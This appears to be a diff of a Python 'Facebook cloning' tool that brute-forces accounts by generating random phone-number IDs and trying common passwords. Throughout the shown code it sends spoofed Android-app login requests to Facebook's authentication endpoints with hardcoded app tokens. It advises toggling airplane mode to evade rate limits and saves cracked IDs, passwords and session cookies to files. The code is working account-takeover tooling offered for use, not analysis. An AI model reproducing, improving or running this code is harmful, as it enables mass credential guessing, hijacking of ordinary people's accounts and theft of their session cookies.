+                os.system('xdg-open https://github.com/BHOOT-CYBER-143')
+        elif tanim in ['3','C']:
+                country()
+        elif tanim in ['4','D']:
+                linex()
+        else:
+                main()
+def country():
+    clear()
+    print(f' \x1b[1;92m[\x1b[1;91mA\x1b[1;92m]\x1b[1;92m[\x1b[1;91m1\x1b[1;92m] BD RANDOM ')
+    print(f' \x1b[1;92m[\x1b[1;91mB\x1b[1;92m]\x1b[1;92m[\x1b[1;91m2\x1b[1;92m] INDIA RANDOM ')
+    linex()
+    cun = input(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] CHOICE : ')
+    if cun in ['1','a','A','01']:
+        __random__()
+    elif cun in ['2','b','B','02']:
+        rndm_ind()
+    elif cun in ['3','c','C','03']:
+        rndm_m()
+    else:
+        rndm_ind()
+#-----------------------[ MAIN-CODE ]-----------------------#
+def __random__():
+        clear()
+        print(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] SIM CODE : 019 018 017');linex()
+        code = input(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] CHOICE : ')
+        clear()
+        print(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] EXAMPLE  : 9999,99999');linex()
+        limit = int(input(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] CHOICE : '))
+        linex()
+        for __Tanimafridi__ in range(limit):
+                _Xx_ = ''.join(random.choice(string.digits) for _ in range(8))
+                user.append(_Xx_)
+        with tred(max_workers=30) as _Tanim_:
+                tl = str(len(user))
+                clear()
+                print(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] SIM CODE \033[38;5;196m :{G} {code} <> \033[38;5;196m[\033[38;5;118mBANGLADESH\033[38;5;196m]\x1b[38;5;46m ')
+                print(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] TOTAL IDS \033[38;5;196m:{G} {limit} <> \033[38;5;196m[\033[38;5;123mRNDM\033[38;5;196m]\x1b[38;5;46m')
+                print(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] USE FLIGHT MODE EVERY 5 MINUTES... ');linex()
+                for love in user:
+                        ids = code + love 
+                        pasx = [ids,love,ids[:8],ids[:7],ids[:6],love[1:],love[2:],'১২৩৪৫৬','১২৩৪৫৬৭৮','aaabbb','102030','203040','405060','607080','708090','@#@#@#','@@@###','09876543','00000000','@@@@####']
+                        _Tanim_.submit(sex,ids,pasx)
+        print('')
+        linex()
+        print(f'\033[38;5;46m TOTAL OK ID : {G}{str(len(ok))}')
+        linex()
+def rndm_ind():
+        clear()
+        print(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] SIM CODE : +91639 {SEX}|{G} +91629 {SEX}|{G} +91961');linex()
+        code = input(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] CHOICE : ')
+        clear()
+        print(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] EXAMPLE  : 2000 {SEX}|{G} 5000 {SEX}|{G} 9999');linex()
+        limit = int(input(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] CHOICE : '))
+        linex()
+        for __Tanimafridi__ in range(limit):
+                _Xx_ = ''.join(random.choice(string.digits) for _ in range(7))
+                user.append(_Xx_)
+        with tred(max_workers=30) as _Tanim_:
+                tl = str(len(user))
+                clear()
+                print(f'           \x1b[1;92m  9-November-2023 ');linex()
+                print(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] TOTAL UID {LX}:{LJ}\x1b[38;5;46m {limit} ━➤ METHOD {LX}[{LG}M1{LX}]')
+                print(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] FIRST \033[1;37m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;37m] \033[1;92mAIRPLANE MODE ');linex()
+                for love in user:
+                        ids = code + love 
+                        pasx = ['57575751','57273200','59039200',ids,love,ids[3:]]
+                        _Tanim_.submit(sex,ids,pasx)
+        print('')
+        linex()
+        print(f'\033[38;5;46m TOTAL OK ID : {G}{str(len(ok))}')
+        linex()
+agents=[]
 
-def menu():
-			clear()
-		#	linex()
-			print(' [1] File cloning\n [2] Random cloning\n [3] gmail cloning \n [4] join whatsap group \n [0] Exit menu')
-			linex()
-			xd=input(' Choose an option: ')
-		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
-			if xd in ['1','01']:
-				clear()
-				print(' Put file example:  /sdcard/Sk.txt  etc..')
-				linex()
-				file = input(' Put file path\033[1;37m: ')
-				try:
-					fo = open(file,'r').read().splitlines()
-				except FileNotFoundError:
-					print(' File location not found ')
-					time.sleep(1)
-					menu()
-				clear()
-				print(' All method working ')
-				linex()
-				print(' \033[1;33m[1] \033[1;37mMethod  (for mix ids)  \033[1;32m (fast) \n\033[1;33m [2] \033[1;37mMethod  (for mix ids) \033[1;32m  (best)  \n\033[1;33m [3]\033[1;37m Method  (with cokies)\033[1;32m   (v.fast) \n\033[1;33m [4]\033[1;37m Method  (for new ids)\033[1;32m   (best) \n \033[1;33m[5] \033[1;37mMethod  (for new ids) \033[1;32m  (slow) \n \033[1;33m[6] \033[1;37mMethod  (for new ids) \n \033[1;33m[7] \033[1;37mMethod  (for new ids) \n \033[1;33m[8] \033[1;37mMethod  (for new ids) ')
-				linex()
-				mthd=input(' Choose: ')
-				linex()
-				plist = []
-				try:
-					ps_limit = int(input(' How many passwords do you want to add ? '))
-				except:
-					ps_limit =1
-				clear()
-				print('\033[1;32m exp: first last,firtslast,first123')
-				linex()
-				for i in range(ps_limit):
-					plist.append(input(f' Put password {i+1}: '))
-				clear()
-				print(' Do you went show cp account? (y/n): ')
-				linex()
-				cx=input(' Choose: ')
-				if cx in ['y','Y','yes','Yes','1']:
-					pcp.append('y')
-				else:
-					pcp.append('n')
-				with tred(max_workers=30) as crack_submit:
-					clear()
-					total_ids = str(len(fo))
-					print(' Total account ids : \033[1;32m'+total_ids+f' ')
-					print(' \033[1;37mThe process is running in the background')
-					linex()
-					for user in fo:
-						ids,names = user.split('|')
-						passlist = plist
-						if mthd in ['1','01']:
-							crack_submit.submit(api1,ids,names,passlist)
-						elif mthd in ['2','02']:
-							crack_submit.submit(api2,ids,names,passlist)
-						elif mthd in ['3','03']:
-							crack_submit.submit(api3,ids,names,passlist)
-						elif mthd in ['4','04']:
-							crack_submit.submit(api4,ids,names,passlist)
-						elif mthd in ['5','05']:
-							crack_submit.submit(api5,ids,names,passlist)
-						elif mthd in ['6','06']:
-							crack_submit.submit(api6,ids,names,passlist)
-						elif mthd in ['7','07']:
-							crack_submit.submit(api7,ids,names,passlist)
-						elif mthd in ['8','08']:
-							crack_submit.submit(api8,ids,names,passlist)
-				print('\033[1;37m')
-				linex()
-				print(' The process has completed')
-				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-				linex()
-				input(' Press enter to back ')
-				os.system('python trt.py')
-			elif xd in ['2','02']:
-				pak()
-			elif xd in ['3','03']:
-				gmail()
-				#create()
-				#dz._login()
-				exit()
-			elif xd in ['4','04']:
-				os.system('xdg-open https://chat.whatsapp.com/01797970064')
-				menu()
-			elif xd in ['0','00']:
-				exit(' Thanks for use ðŸ¥° ')
-			else:
-				exit(' Option not found in menu...')
-		
-def pak():
-		user=[]
-		clear()
-		print('\033[1;35m Code example: 0306,0315,0335,0345')
-		code = input('\033[1;37m put code: ')
-		try:
-			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
-		except ValueError:
-			limit = 5000
-		clear()
-		print('\033[1;32m [1] \033[1;33mMethod   (best) \033[1;32m \n [2] \033[1;33mMethod   (v-fast)  \033[1;32m \n [3] \033[1;33mMethod   (v-best)  \033[1;32m \n [4] \033[1;33mMethod   (with cokies) \033[1;32m \n [5] \033[1;33mMethod   (slow)  \033[1;32m \n [6] \033[1;33mMethod   (slow) ')
-		linex()
-		mthd = input(' Choose: ')
-		clear()
-		print('\033[1;32m [1] \033[1;33mClone with 7+11 digit pass (v-fast) \n\033[1;32m [2]\033[1;33m Clone with auto pass (best) \n\033[1;32m [3]\033[1;33m Clone with auto pass (fast)\n\033[1;32m [5] \033[1;33mClone with auto pass (slow-best) \n\033[1;32m [5] \033[1;33mClone with auto pass (slow-fast) \n\033[1;32m [6] \033[1;33mClone with auto pass (slow-best) \n\033[1;32m [7] \033[1;33mClone with auto pass (only-BD) \n\033[1;32m [8] \033[1;33mClone with auto pass (only-AFG) ')
-		linex()
-		pcs = input(' [?] Select: ')
-		for nmbr in range(limit):
-			nmp = ''.join(random.choice(string.digits) for _ in range(7))
-			user.append(nmp)
-		with tred(max_workers=30) as TRT:	
-			clear()
-			tl = str(len(user))
-			print(' Total ids : \033[1;32m'+tl+f' ')
-			print(f'\033[1;37m Choice code  :\033[1;32m '+code)
-			print(' \033[1;37mThe process is running in the background')
-			linex()
-			for psx in user:
-				ids = code+psx
-				if pcs in ['1','01']:
-					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
-				if pcs in ['2','02']:
-					passlist = [psx,ids,'khankhan','khan1122','ali12345','pakistan','khan12345','ali1122','baloch12345','khan','baloch','khan','pubg','pubg1122','malik786']
-				elif pcs in ['3','03']:
-					passlist = [psx,ids,'pubg','pubg1122','pubgking','pubg12','pubg123','pubg1234']
-				elif pcs in ['4','04']:
-					passlist = [psx,ids,'khankhan','khan1122','khan1234','khan123']
-				elif pcs in ['5','05']:
-					passlist = [psx,ids]
-				elif pcs in ['6','06']:
-					passlist = [psx,ids,'khankhan','khan1122','786786','ali786','khan123','khan12','pakistan','ali123','khanbaba']
-				elif pcs in ['7','07']:
-					passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
-				elif pcs in ['8','08']:
-					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
-				if mthd in ['1','01']:
-					TRT.submit(trt1,ids,passlist)
-				if mthd in ['2','02']:
-					TRT.submit(trt2,ids,passlist)
-				if mthd in ['3','03']:
-					TRT.submit(trt3,ids,passlist)
-				if mthd in ['4','04']:
-					TRT.submit(trt4,ids,passlist)
-				if mthd in ['5','05']:
-					TRT.submit(trt5,ids,passlist)
-				if mthd in ['6','06']:
-					TRT.submit(trt6,ids,passlist)
-		print('\033[1;37m')
-		linex()
-		print(' The process has completed')
-		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-		linex()
-		input(' Press enter to back ')
-		os.system('python trt.py')
-
-def gmail():
-		os.system('rm -rf .re.txt')
-		clear()
-		print('\033[1;37m example: ramzan, ali, sajjad, faizan\033[1;97m')
-		linex()
-		first = input(' Put first name: ')
-		linex()
-		print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
-		linex()
-		last = input(' Put last name: ')
-		linex()
-		print(' Example: @gmail.com ')
-		linex()
-		domain = input(' domain: ')
-		linex()
-		try:
-			limit=int(input(' Put limit: '))
-		except ValueError:
-			limit = 5000
-		clear()
-		print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')
-		linex()
-		pxc = input(' Choose : ')
-		clear()
-		print('\033[1;32m [1] \033[1;33mMethod   (best) \033[1;32m \n [2] \033[1;33mMethod   (v-fast)  \033[1;32m \n [3] \033[1;33mMethod   (v-best)  \033[1;32m \n [4] \033[1;33mMethod   (slow) \033[1;32m \n [5] \033[1;33mMethod   (slow)  \033[1;32m \n [6] \033[1;33mMethod   (slow) ')
-		linex()
-		mthd = input(' Choose: ')
-		linex()
-		print(' Getting gmails...')
-		lists = ['3','4']
-		for xd in range(limit):
-			lchoice = random.choice(lists)
-			if '3' in lchoice:
-				mail = ''.join(random.choice(string.digits) for _ in range(3))
-				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-			else:
-				mail = ''.join(random.choice(string.digits) for _ in range(4))
-				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-			fo = open('.re.txt', 'r').read().splitlines()
-		with tred(max_workers=30) as TRT:
-			total = str(len(fo))
-			clear()
-			print(' Total ids : \033[1;32m'+total+f' ')
-			print(' \033[1;37mThe process is running in the background')
-			linex()
-			for user in fo:
-				ids,names = user.split('|')
-				first_name = names.rsplit(' ')[0]
-				try:
-					last_name = names.rsplit(' ')[1]
-				except IndexError:
-					last_name = 'Khan'
-				fs = first_name.lower()
-				ls = last_name.lower()
-				if pxc in ['1','01']:
-					passlist = [fs+ls,fs+' '+ls,fs]
-				elif pxc in ['2','02']:
-					passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122']
-				elif pxc in ['3','03']:
-					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123']
-				else:
-					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
-				if mthd in ['1','01']:
-					TRT.submit(trt1,ids,passlist)
-				if mthd in ['2','02']:
-					TRT.submit(trt2,ids,passlist)
-				if mthd in ['3','03']:
-					TRT.submit(trt3,ids,passlist)
-				if mthd in ['4','04']:
-					TRT.submit(trt4,ids,passlist)
-				if mthd in ['5','05']:
-					TRT.submit(trt5,ids,passlist)
-				if mthd in ['6','06']:
-					TRT.submit(trt6,ids,passlist)
-		print('\033[1;37m')
-		linex()
-		print(' The process has completed')
-		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-		linex()
-		input(' Press enter to back ')
-		os.system('python trt.py')
-#b-api method
-#1method
-def api1(ids,names,passlist):
-		try:
-			global ok,loop
-			sys.stdout.write('\r\r\033[1;37m [TRT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-			fn = names.split(' ')[0]
-			try:
-				ln = names.split(' ')[1]
-			except:
-				ln = fn
-			for pw in passlist:
-				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-				
-				application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
-				application_version_code=str(random.randint(000000000,999999999))
-				__iam_genius = random.choice(android_models)
-				phone_model = __iam_genius.split('|')[0]
-				phone_company = __iam_genius.split('|')[1]
-				dimensions = __iam_genius.split('|')[2]
-				ffb=random.choice(fbks)
-				dvlk = random.choice(usr)
-				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/8.1.0;;FBDM/'+'{density=2.75,height=1440,width=720};]'
-				li = ['28','29','210']
-				li2 = random.choice(li)
-				j1 = ''.join(random.choice(digits) for _ in range(2))
-				j2 = li2+j1
-				device_family_id = str(uuid.uuid4())
-				adid = str(uuid.uuid4())
-				machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
-				data = {'adid':adid,
-				'format':'json',
-				'device_id':device_family_id,
-				'email':ids,
-				'password':pas,
-				'generate_analytics_claim':'1',
-				'community_id':'','cpl':'true','try_num':'1',
-				'family_device_id':device_family_id,
-				'credentials_type':'device_based_login_password',
-				'generate_session_cookies':'1',
-				'error_detail_type':'button_with_disabled',
-				'source':'device_based_login',
-				'machine_id':machine_id,
-				'login_location_accuracy_m':'1.0',
-				'meta_inf_fbmeta':'',
-				'advertiser_id':adid,
-				'encrypted_msisdn':'',
-				'currently_logged_in_userid':'0',
-				'locale':'en_PK',
-				'client_country_code':'PK',
-				'method':'auth.login',
-				'fb_api_req_friendly_name':'authenticate',
-				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
-				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-				head = {
-				'content-type':'application/x-www-form-urlencoded',
-				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-				'x-fb-connection-type':'unknown',
-				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-				'user-agent':ua_string,
-				'x-fb-net-hni':str(random.randint(2e4,4e4)),
-				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-				'x-fb-connection-quality':'EXCELLENT',
-				'x-fb-friendly-name':'authenticate',
-				'accept-encoding':'gzip, deflate',
-				'x-fb-http-engine':	'Liger'}
-				url = 'https://b-api.facebook.com/method/auth.login'
-				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
-				q = json.loads(po)
-				if 'session_key' in q:
-					print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
-					oks.append(ids)
-					break
-				elif 'www.facebook.com' in q['error_msg']:
-					if 'y' in pcp:
-						print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-						open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
-						cps.append(ids)
-						break
-					else:
-						open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
-						break
-				else:
-					continue
-			loop+=1
-		except requests.exceptions.ConnectionError:
-			time.sleep(10)
-		except Exception as e:
-			pass
-#m2
-#b-graph method		
-def api2(ids,names,passlist):
+def sex(ids,pasx):
+        global loop,ok
+        asvs = random.choice(["\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;86m"])
+        ass = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;96m","\033[1;97m"])
+        sys.stdout.write(f'\r \x1b[38;5;223m[{asvs}BLACK-XD\x1b[38;5;223m]-[{ass}%s\x1b[38;5;223m]-[{G}OK:%s\x1b[38;5;223m]'%(loop,len(ok)));sys.stdout.flush()
+        sys.stdout.flush()
         try:
-                global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [TRT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        en = random.choice(['en_US','en_GB'])
-                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
-                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua ='Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=2.75,width=720,height=9398};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/TRT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        oks.append(ids)
-                                        break
-                        elif twf in str(po):
-                                        if 'y' in pcp:
-                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
-                                                twf.append(ids)
-                                                break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                                        else:
-                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                        else:
-                                        continue
-                loop+=1
-        except Exception as e:
-                pass
-  #method3             
-def api3(ids,names,passlist):
-        try:
-                global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [TRT-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                "adid": adid,
-"format": "json",
-"device_id": str(uuid.uuid4()),
-"email": ids,
-"password": pas,
-"generate_analytics_claims": "1",
-"credentials_type": "password",
-"source": "login",
-"error_detail_type": "button_with_disabled",
-"enroll_misauth": "false",
-"generate_session_cookies": "1",
-"generate_machine_id": "1",
-"fb_api_req_friendly_name": "authenticate",}
-                        headers={
-                                "Accept-Encoding": "gzip, deflate",
-"Accept": "*/*",
-"Connection": "keep-alive",
-"User-Agent": ua,
-"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"X-FB-Friendly-Name": "authenticate",
-"X-FB-Connection-Type": "unknown",
-"Content-Type": "application/x-www-form-urlencoded",
-"X-FB-HTTP-Engine": "Liger",
-"Content-Length": "329",}
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        print("Cookie: "+coki)
-                                        open('/sdcard/TRT-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        oks.append(ids)
-                                        break
-                        elif twf in str(po):
-                                        if 'y' in pcp:
-                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
-                                                twf.append(ids)
-                                                break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                                        else:
-                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                        else:
-                                        continue
-                loop+=1
-        except Exception as e:
-                pass
-#b-api method
-#method3                
-def api4(ids,names,passlist):
-        try:
-                global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [TRT-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2376};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                'adid':adid,
-                                'format':'json',
-                                'device_id':device_id,
-                                'email':ids,
